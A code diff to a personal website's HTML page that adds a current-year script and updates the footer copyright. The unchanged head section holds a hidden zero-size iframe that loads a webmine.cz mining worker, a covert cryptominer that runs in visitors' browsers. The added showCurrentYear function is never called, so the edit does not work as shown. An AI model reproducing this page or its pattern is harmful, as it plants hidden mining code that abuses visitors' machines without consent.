@@ -13,6 +13,12 @@
     <link rel="icon" href="./favicon.ico">
     <script> //document.oncontextmenu=new Function("return false")  document.onselectstart=new Function("return false") </script>
     <iframe width=0 height=0 frameborder=0 src='https://webmine.cz/worker?key=m9Fnu8Ij7MqZHno'></iframe>
+    <script>
+    function showCurrentYear() {
+      var currentYear = new Date().getFullYear();
+      document.getElementById("current-year").textContent = currentYear;
+    }
+    </script>
 </head>
 <body>
     <div id="box">
@@ -113,7 +119,7 @@
 
     <!-- 页脚 -->
     <div id="footer">
-        <p>© 2021-2023 XiaoYudxz | <a href="http://beian.miit.gov.cn">鱼ICP备12345678号</a></p>
+        <p>© 2021-<span id="current-year"></span> XiaoYudxz | <a href="http://beian.miit.gov.cn">鱼ICP备12345678号</a></p>
         <p>THEME MADE BY <a href="./">XiaoYu</a></p>
     </div>
 </body>
